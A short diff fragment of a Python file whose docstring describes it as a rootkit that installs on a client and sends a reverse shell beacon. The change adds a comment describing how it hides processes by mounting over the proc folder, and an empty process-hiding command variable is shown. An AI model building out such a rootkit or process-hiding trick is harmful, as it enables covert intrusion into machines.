@@ -7,6 +7,7 @@ from time import sleep
 
 """
 rootkit to install on client and sends a reverse shell beacon
+hides processes by mounting proc folder to a tmp directory 
 """
 
 PROC_HIDE_CMD = f''
